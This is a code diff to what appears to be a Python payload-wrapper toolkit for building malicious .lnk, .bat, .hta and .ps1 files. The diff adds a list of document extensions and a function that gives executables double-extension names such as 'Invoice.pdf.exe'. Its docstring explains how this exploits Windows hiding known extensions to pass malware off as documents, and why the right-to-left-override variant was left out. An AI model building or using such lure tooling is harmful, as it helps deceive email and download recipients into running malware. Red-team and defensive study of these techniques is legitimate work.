@@ -264,6 +264,63 @@ def lnk(payload: str | PureWindowsPath, decoy: str | PureWindowsPath | None = No
     return header + b"".join(_string_data(item) for item in strings) + struct.pack("<I", 0)
 
 
+# Document extensions a double extension may wear. Restricted to types that arrive by
+# email or from a download page, because the trick is only worth anything in a context
+# where a document was expected.
+MASQUERADE_EXTENSIONS: Final[frozenset[str]] = frozenset(
+    {
+        ".pdf",
+        ".doc",
+        ".docx",
+        ".xls",
+        ".xlsx",
+        ".csv",
+        ".txt",
+        ".rtf",
+        ".jpg",
+        ".jpeg",
+        ".png",
+        ".gif",
+        ".mp4",
+        ".mp3",
+        ".zip",
+        ".7z",
+    }
+)
+
+
+def double_extension(lure: str, real: str = ".exe") -> str:
+    """``Invoice.pdf`` + ``.exe`` -> ``Invoice.pdf.exe``.
+
+    This is a naming decision, not a file transformation: the payload is copied to the
+    returned name and its bytes never change.
+
+    **The honest limit.** It works because Windows ships with ``HideExtensionsForNetUser``
+    on, so Explorer renders ``Invoice.pdf.exe`` as ``Invoice.pdf`` and hands it to the PDF
+    association's icon. On a host where that policy is off the full name is visible and the
+    artifact reads as exactly what it is. Nothing in the artifact can change that, and a
+    build that assumed otherwise would be wrong on every well-managed machine.
+
+    The right-to-left override form (``Invoice\\u202efdp.exe``) is deliberately not
+    produced here: Explorer has normalised the display of U+202E since Windows 10 1809, so
+    it buys a mangled filename and no illusion.
+    """
+    text = str(PureWindowsPath(lure))
+    if not text or "\\" in text or "/" in text or ":" in text:
+        raise WrapperError(f"lure: {lure!r} is not a plain filename")
+    path = PureWindowsPath(text)
+    if path.stem == "" or path.suffix == "":
+        raise WrapperError(f"lure: {lure!r} has no extension to hide behind")
+    bad = [ch for ch in _FORBIDDEN if ch in text]
+    if bad:
+        raise WrapperError(f"lure: {text!r} contains {bad[0]!r}")
+    if path.suffix.lower() not in MASQUERADE_EXTENSIONS:
+        raise WrapperError(f"lure: {path.suffix!r} is not a document extension")
+    if not real.startswith(".") or len(real) < 2:
+        raise WrapperError(f"real: {real!r} is not an extension")
+    return f"{text}{real}"
+
+
 WRAPPERS: Final[dict[str, Callable[..., bytes]]] = {
     "bat": bat,
     "hta": hta,
@@ -318,10 +375,12 @@ __all__ = [
     "EXTENSIONS",
     "LNK_CLSID",
     "LNK_HEADER_SIZE",
+    "MASQUERADE_EXTENSIONS",
     "WRAPPERS",
     "WrapperError",
     "bat",
     "build",
+    "double_extension",
     "hta",
     "lnk",
     "ps1",
